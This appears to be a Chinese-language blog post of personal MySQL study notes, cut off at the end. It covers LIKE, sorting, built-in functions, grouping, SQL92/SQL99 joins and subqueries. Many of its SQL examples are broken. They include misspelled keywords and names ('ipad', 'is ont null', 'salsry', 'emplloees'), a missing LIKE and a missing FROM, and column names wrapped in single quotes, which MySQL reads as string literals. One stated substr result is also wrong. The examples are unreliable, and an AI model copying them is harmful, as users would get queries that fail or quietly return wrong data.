class=\"code\"><pre><span class=\"line\">select 字段 from 表名 where like &#x27;_$_&#x27; escape &#x27;$&#x27;; //使用$符号对下划线进行转义</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select × from 表名 where like %a%;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>安全等于  &lt;=&gt; : 可以判断显示NULL</li>\n</ol>\n<h4 id=\"3、排序查询\"><a href=\"#3、排序查询\" class=\"headerlink\" title=\"3、排序查询\"></a>3、排序查询</h4><ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 字段</span><br><span class=\"line\">from 表</span><br><span class=\"line\">where 筛选条件</span><br><span class=\"line\">order by 排序列表 asc|desc   //不写关键字，默认是asc</span><br><span class=\"line\"># asc 从低到高 （升序）</span><br><span class=\"line\"># desc 从高到底 （降序）</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>支持别名排序， 运算表达式排序</li>\n<li>支持对多个列表进行先后排序查询，列表间用逗号隔开</li>\n<li>排序语句一般是放在查询语句的最后面</li>\n</ul>\n<h4 id=\"常见函数\"><a href=\"#常见函数\" class=\"headerlink\" title=\"常见函数\"></a>常见函数</h4><ul>\n<li>类似python中的方法</li>\n<li>函数可以嵌套使用</li>\n<li>分类：</li>\n</ul>\n<ol>\n<li>单行函数：concat, length, ifnull等</li>\n<li>分组函数：<ul>\n<li>功能：做统计使用，又称为统计函数，聚合函数，组函数</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"单行函数\"><a href=\"#单行函数\" class=\"headerlink\" title=\"单行函数\"></a>单行函数</h5><h6 id=\"一、字符函数\"><a href=\"#一、字符函数\" class=\"headerlink\" title=\"一、字符函数\"></a>一、字符函数</h6><ol>\n<li>length </li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select length(&#x27;str&#x27;);</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>concat ( ) 拼接函数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">concat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开</span><br><span class=\"line\"># 若str中有值为NULL，则查询的所有值为NULL</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><p>upper( ), lower( ) :改变大小写</p>\n</li>\n<li><p>substr( ) ：截取字符函数</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select substr(&#x27;今天买了个大白菜&#x27;， 6);</span><br><span class=\"line\">结果: 大白菜</span><br><span class=\"line\">select substr(&#x27;今天买了个大白菜&#x27;， 3, 4);</span><br><span class=\"line\">结果: 买了</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>instr( ) :返回字串第一个字符的索引，没有则返回0</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select instr(&#x27;今天买了个大白菜&#x27;， &#x27;大白菜&#x27;);</span><br><span class=\"line\">结果：6</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>trim( ) :去掉字段中的空格或指定字符</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select trim(&#x27;烂的&#x27; from &#x27;今天买了个烂的大白菜&#x27;);</span><br><span class=\"line\">结果：今天买了个大白菜</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li><p>lpad( ): 左填充指定长度的字符，</p>\n<p>rpad( ): 右填充指定长度的字符</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select ipad(&#x27;大白菜&#x27;, 6, &#x27;*&#x27;);</span><br><span class=\"line\">结果：×××大白菜</span><br><span class=\"line\">select rpad(&#x27;大白菜&#x27;, 6, &#x27;*&#x27;);</span><br><span class=\"line\">结果：大白菜×××</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>replace 替换</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(&#x27;今天买了个大白菜&#x27;, &#x27;大白菜&#x27;, &#x27;胡萝卜&#x27;);</span><br><span class=\"line\">结果：今天买了个胡萝卜</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"二、数学函数\"><a href=\"#二、数学函数\" class=\"headerlink\" title=\"二、数学函数\"></a>二、数学函数</h6><ol>\n<li>round( ) : 四舍五入函数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select round(1.1236);  //默认保留整数部分</span><br><span class=\"line\">结果：1</span><br><span class=\"line\">select round(1.1236, 3);  //可指定保留小数部分</span><br><span class=\"line\">结果：1.124</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>ceil( ): 向上取整，返回 &gt;= 该函数的最小整数</li>\n<li>floor( ): 向下取整，返回  &lt;= 该函数的最大整数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select floor(-9.99);</span><br><span class=\"line\">结果：-10</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>truncate 截断函数，截断小数点后指定的位数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select truncate(1.123, 2);</span><br><span class=\"line\">结果：1.12</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>mod( ): 取模（取余）函数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select mod(10,3);</span><br><span class=\"line\">结果：1</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"三、日期函数\"><a href=\"#三、日期函数\" class=\"headerlink\" title=\"三、日期函数\"></a>三、日期函数</h6><ol>\n<li>now( ) 返回当前系统日期+时间</li>\n<li>curdate( ) 返回当前系统日期，不返回时间</li>\n<li>curtime( ) 返回当前时间，不返回日期</li>\n<li>str_to_date( ) 将日期格式的字符转换成指定格式的日期</li>\n<li>date_format( ) 将日期转换成字符</li>\n</ol>\n<ul>\n<li>更多日期函数请上网搜索</li>\n</ul>\n<h6 id=\"四、流程控制函数\"><a href=\"#四、流程控制函数\" class=\"headerlink\" title=\"四、流程控制函数\"></a>四、流程控制函数</h6><ol>\n<li>if( ) :该函数起到的作用类似与python或C语言中的else if( )函数</li>\n<li>case( )： </li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case 要判断的字段或表达式    // 选择函数——判断并选择显示一个</span><br><span class=\"line\">when 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 </span><br><span class=\"line\">when 常量2 then 要显示的值2或语句2;</span><br><span class=\"line\">...</span><br><span class=\"line\">else 默认显示的值或语句</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case</span><br><span class=\"line\">when 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 </span><br><span class=\"line\">when 常量2 then 要显示的值2或语句2;</span><br><span class=\"line\">...</span><br><span class=\"line\">else 默认显示的值或语句</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"五、其它函数\"><a href=\"#五、其它函数\" class=\"headerlink\" title=\"五、其它函数\"></a>五、其它函数</h6><ul>\n<li>其他函数太多，用时上网搜</li>\n</ul>\n<h5 id=\"分组函数\"><a href=\"#分组函数\" class=\"headerlink\" title=\"分组函数\"></a>分组函数</h5><ul>\n<li>功能：用作统计使用，又称为聚合函数或统计函数或组函数</li>\n<li>分类：sum 求和， avg 平均值， max， min， count 计算个数</li>\n<li>忽略 NULL值</li>\n<li>可以与distinct( )去重函数或其它函数搭配使用</li>\n<li>count( )详细介绍</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*) from 表单;  //统计总行数</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>和分组函数一同查询的字段要求是group by后的字段</li>\n</ul>\n<h4 id=\"4、分组查询\"><a href=\"#4、分组查询\" class=\"headerlink\" title=\"4、分组查询\"></a>4、分组查询</h4><ol>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 分组函数，列（要求出现在group by的后面）</span><br><span class=\"line\">from 表</span><br><span class=\"line\">[where 筛选条件]</span><br><span class=\"line\">group by 分组的列表;</span><br><span class=\"line\">[order by 子句]</span><br><span class=\"line\"></span><br><span class=\"line\">// 查询列表必须特殊，要求是分组函数和group by 后出现的字段</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>简单的分组查询</li>\n</ul>\n<ol>\n<li>实例一：查询每个工种的最高工资</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select max(salary), job_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">group by job_id;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>实例二：查询每个位置上的部门个数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*), location_id</span><br><span class=\"line\">from departments</span><br><span class=\"line\">group by lacation_id;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>添加筛选条件的分组查询</li>\n</ul>\n<ol start=\"4\">\n<li>实例三：查询邮箱中包含a字符的，每个部门的平均工资</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select avg(salsry), department_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where email &#x27;%a%&#x27;</span><br><span class=\"line\">group by department_id;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>实例四：查询有奖金的每个领导手下员工的最高工资</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select max(salary), manager_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where commission_pct is ont null</span><br><span class=\"line\">group by manager_id;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>添加复杂筛选条件的分组查询</li>\n<li>分组后进行条件筛选的查询</li>\n</ul>\n<ol start=\"6\">\n<li>实例五：查询哪个部门的员工个数&gt;2</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*), depatment_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">group by department_id</span><br><span class=\"line\">having count(*)&gt;2;   //用查询的结果再进行筛选时用having</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"5、连接查询【-优先学习99语法-】\"><a href=\"#5、连接查询【-优先学习99语法-】\" class=\"headerlink\" title=\"5、连接查询【 优先学习99语法 】\"></a>5、连接查询【 优先学习99语法 】</h4><ol>\n<li><p>含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询</p>\n</li>\n<li><p>笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行</p>\n<ol>\n<li>发生原因：没有有效的链接条件</li>\n<li>如何避免：添加有效的连接条件</li>\n</ol>\n</li>\n<li><p>按功能分类：</p>\n<ul>\n<li><p>内连接：等值连接</p>\n<p>​               非等值连接</p>\n<p>​               自连接</p>\n</li>\n<li><p>外连接：左外连接</p>\n<p>​               右外连接</p>\n<p>​               全外连接</p>\n</li>\n<li><p>交叉连接</p>\n</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"SQL92语法\"><a href=\"#SQL92语法\" class=\"headerlink\" title=\"SQL92语法\"></a>SQL92语法</h5><p>(1) 等值查询</p>\n<ul>\n<li>查询员工名和对应的部门名</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select last_name, department_name</span><br><span class=\"line\">from employees, departments</span><br><span class=\"line\">where employees.&#x27;department_id=departments.&#x27;department_id&#x27;;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>多条件筛选连接查询<ul>\n<li>查询有奖金的员工名，部门名</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select last_name, department_name, commission_pct</span><br><span class=\"line\">from emplloees e, departments d</span><br><span class=\"line\">where e.&#x27;department_id&#x27;=d.&#x27;department_id&#x27;</span><br><span class=\"line\">and e.&#x27;commission_pct&#x27; is not null;</span><br></pre></td></tr></table></figure>\n\n<p>(2) 非等值链接</p>\n<ul>\n<li>在等值链接的基础上将条件改为非等值就行</li>\n</ul>\n<p>(3) 自链接</p>\n<ul>\n<li><p>自己链接自己</p>\n</li>\n<li><p>实例:查询查询一张表中员工名和上级的名称</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select e.employee_id, e.last_name, m.employee_id, m.last_name</span><br><span class=\"line\">from employees e, employees m</span><br><span class=\"line\">where e.&#x27;manager_id&#x27;=m.&#x27;employee_id&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"SQL99语法\"><a href=\"#SQL99语法\" class=\"headerlink\" title=\"SQL99语法\"></a>SQL99语法</h5><ul>\n<li><p>语法： select 查询列表</p>\n<p>​            from 表1 别名</p>\n<pre><code>        [连接类型]  join 表2 别名\n</code></pre>\n<p>​            on 连接条件</p>\n<p>​            where 筛选条件</p>\n<p>​            group by 分组</p>\n<p>​            having 筛选条件</p>\n<p>​            order by 排序条件</p>\n</li>\n</ul>\n<h6 id=\"内链接\"><a href=\"#内链接\" class=\"headerlink\" title=\"内链接\"></a>内链接</h6><ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表</span><br><span class=\"line\">from 表1 别名</span><br><span class=\"line\">inner join 表2 别名</span><br><span class=\"line\">on 连接条件；</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>分类：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内链接：inner</span><br><span class=\"line\">外链接</span><br><span class=\"line\">\t左外：left【outer】  //括号中outer可以省去</span><br><span class=\"line\">\t右外：right 【outer】</span><br><span class=\"line\">\t全外：full 【outer</span><br><span class=\"line\">交叉连接：cross</span><br></pre></td></tr></table></figure>\n\n\n\n<ol>\n<li>等值查询（内连接）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例1 查询员工名、部门名</span><br><span class=\"line\">select last_name, department_name</span><br><span class=\"line\">from employees e</span><br><span class=\"line\">inner join departments d</span><br><span class=\"line\">on e.&#x27;department_id&#x27; = d.&#x27;department_id&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"2\">\n<li>非等值连接(内链接)</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例1：查询员工的工资级别</span><br><span class=\"line\">select salary, grdae_level</span><br><span class=\"line\">from employees e</span><br><span class=\"line\">join job_grades g</span><br><span class=\"line\">on e.&#x27;salary&#x27; between g.&#x27;lowest_sal&#x27; and &#x27;highest_sal&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li>自连接（内连接）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询员工的名字，上级的名字,包含字符k的</span><br><span class=\"line\">select e.last_name, m.last_name</span><br><span class=\"line\">join employees m</span><br><span class=\"line\">on e.&#x27;manager_id&#x27; = m.&#x27;employee_id&#x27;</span><br><span class=\"line\">where e.&#x27;last_name&#x27; like &#x27;%k%&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h6 id=\"外连接\"><a href=\"#外连接\" class=\"headerlink\" title=\"外连接\"></a>外连接</h6><ul>\n<li>应用场景，一个表格有，一个表格没有</li>\n<li>特点：</li>\n</ul>\n<ol>\n<li><p>外连接的查询结果为主表中的所有记录</p>\n<p>如果从表中有和他匹配的，则显示匹配值</p>\n<p>如果从表中没有和它匹配的值，则显示null</p>\n<p>外连接查询结果=内链接结果+主表中有而从表中没有的记录</p>\n</li>\n<li><p>左外连接，left join左边的是主表</p>\n<p>右外连接，right join右边的是主表</p>\n<p>左外右外和俩个表都换一下顺序，可以实现同样的效果</p>\n</li>\n</ol>\n<ul>\n<li><p>主表：查询内容较多的表格</p>\n</li>\n<li><p>全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的</p>\n</li>\n</ul>\n<h6 id=\"交叉连接\"><a href=\"#交叉连接\" class=\"headerlink\" title=\"交叉连接\"></a>交叉连接</h6><ul>\n<li>相当于用99语法实现的笛卡尔乘积</li>\n</ul>\n<p>图示：</p>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBjOQf.png\" alt=\"NBjOQf.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBjXy8.png\" alt=\"NBjXy8.png\"></p>\n<h4 id=\"6、子查询\"><a href=\"#6、子查询\" class=\"headerlink\" title=\"6、子查询\"></a>6、子查询</h4><ol>\n<li>含义：出现在其他语句中的select语句，称为子查询或内查询</li>\n<li>分类：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">按子查询出现的位置：</span><br><span class=\"line\">\t\tselect后面：</span><br><span class=\"line\">\t\t\t仅仅支持标量子查询</span><br><span class=\"line\">\t\tfrom后面：</span><br><span class=\"line\">\t\t\t支持表子查询</span><br><span class=\"line\">\t\twhere或having后面： // 重点</span><br><span class=\"line\">\t\t\t标量子查询\t   //  重点</span><br><span class=\"line\">\t\t\t列子查询\t\t// 重点</span><br><span class=\"line\">\t\t\t行子查询\t\t// 重点</span><br><span class=\"line\">\t\texists后面（相关子查询）</span><br><span class=\"line\">\t\t\t表子查询</span><br><span class=\"line\">按结果集的行列数不同：</span><br><span class=\"line\">\t\t标量子查询：结果集只有一行一列</span><br><span class=\"line\">\t\t列子查询：结果集有一列多行</span><br><span class=\"line\">\t\t行子查询：结果集有一行多列</span><br><span class=\"line\">\t\t表子查询：结果集有多行多列</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>（一）where或having后面</li>\n</ul>\n<ol>\n<li><p>标量子查询（单行子查询）</p>\n</li>\n<li><p>列子查询（多行子查询）</p>\n</li>\n<li><p>行子查询（多行多列）</p>\n</li>\n<li><p>特点：（1）子查询放在小括号内</p>\n<p>​           （2）子查询一般放在条件的右侧</p>\n<p>​            （3）标量子查询，一般搭配着单行操作符使用&lt;  &gt; =   &gt;=  &lt;=等</p>\n<p>​                     列子查询，一般搭配多行操作符使用 in, any,some, all</p>\n<p>​              (4)子查询的执行优先于主查询，因为主查询要用到子查询</p>\n</li>\n<li><p>标量子查询</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：谁的工资比sam高？</span><br><span class=\"line\">#查询sam的工资</span><br><span class=\"line\">select salary</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where last_name = &#x27;sam&#x27;；</span><br><span class=\"line\"></span><br><span class=\"line\">#查询员工的信息，满足salary &gt; sam工资 的结果</span><br><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where salary &gt;(</span><br><span class=\"line\">    select salary</span><br><span class=\"line\">    from employees      //为更清晰的表达，子查询最好进行缩进</span><br><span class=\"line\">    where last_name = &#x27;sam&#x27;  </span><br><span class=\"line\">)；</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：返回公司工资最少的员工的last_name,job_id,salary</span><br><span class=\"line\">#查询公司的最低工资</span><br><span class=\"line\">select min(salary)</span><br><span class=\"line\">from empolyees;</span><br><span class=\"line\"></span><br><span class=\"line\">#查询last_name, job_id, salary, 要求salary= 公司的最低工资</span><br><span class=\"line\">select last_name, job_id, salary</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where salary=(</span><br><span class=\"line\">    select min(salary)</span><br><span class=\"line\">    from empolyees</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"2\">\n<li>列子查询(多行子查询）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：返回location_id是1400或1700的部门中的所有员工姓名</span><br><span class=\"line\">#查询location_id是1700或1400的部门编号</span><br><span class=\"line\">select department_id</span><br><span class=\"line\">from departments</span><br><span class=\"line\">where location_id in(1400, 1700);</span><br><span class=\"line\"></span><br><span class=\"line\">#查询员工姓名，要求部门号是上个查询结果中的某一个</span><br><span class=\"line\">select employees</span><br><span class=\"line\">where department_id in(</span><br><span class=\"line\">    select department_id</span><br><span class=\"line\">    from departments</span><br><span class=\"line\">    where location_id in(1400, 1700)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li><p>行子查询（多行多列）</p>\n<p>略</p>\n</li>\n</ol>\n<ul>\n<li>（二）放在select后面的标量子查询</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：查询每个部门的员工个数</span><br><span class=\"line\">select d.*, (</span><br><span class=\"line\">\tselect count(*)</span><br><span class=\"line\">\tfrom empolyees e</span><br><span class=\"line\">\twhere e.department_id = d.&#x27;department_id&#x27;</span><br><span class=\"line\">) 个数</span><br><span class=\"line\">from departments d;</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>（三）放在from后面<ul>\n<li>将子查询结果当成一张表，要求必须起别名</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：查询每个部门的平均工资的平均等级</span><br><span class=\"line\">#查询每个部门的平均工资</span><br><span class=\"line\">select avg(salary), department_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">group by department_id</span><br><span class=\"line\"></span><br><span class=\"line\">#连接上个查询结果集和job_grades表，筛选条件平均工资</span><br><span class=\"line\">select ag_dep.*, g.&#x27;grade_level&#x27;</span><br><span class=\"line\">from(</span><br><span class=\"line\">\tselect avg(salary), department_id</span><br><span class=\"line\">\tfrom employees</span><br><span class=\"line\">\tgroup by department_id</span><br><span class=\"line\">) ag_dep</span><br><span class=\"line\">inner join job_grades g</span><br><span class=\"line\">on ag_dep.ag between lowest_sal and highest_sal;</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>（四）放在exists后面（相关子查询）<ul>\n<li>能用exists的都能用in代替</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：</span><br><span class=\"line\">\texists 完整的查询语句</span><br><span class=\"line\">结果：0或1   //返回一个布尔值</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight 